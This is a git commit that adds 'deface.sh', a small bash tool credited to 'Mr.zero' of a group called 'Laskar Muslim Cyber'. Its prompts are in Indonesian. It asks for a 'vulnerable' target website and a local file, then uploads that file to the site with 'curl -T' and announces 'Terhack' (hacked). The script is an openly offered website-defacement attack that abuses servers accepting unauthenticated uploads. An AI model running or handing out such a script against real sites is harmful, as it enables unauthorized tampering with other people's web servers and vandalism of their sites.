c9d11753a1b9d3fa18fa826d0940e4cd77e29f40
Mrzero406 <68005752+Mrzero406@users.noreply.github.com>
2020-07-08 16:50:40 +0700

    Add files via upload

---
+++ deface.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+#deface
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+echo
+toilet -f big -F gay deface
+echo
+
+	echo "======================================"
+	echo "Author:Mr.zero"
+	echo "Team:Laskar Muslim Cyber"
+	echo "YT:Mr Zero"
+	echo "======================================"
+
+echo "Masukkan target kamu pastikan web vuln : "
+read target
+echo "Masukkan File Kamu : "
+read file
+sleep 1
+echo "PlaseWait...."
+sleep 2
+curl -T /sdcard/$file $target
+echo "Terhack"
+echo "Terimaksih sudah memakai tools saya "
+
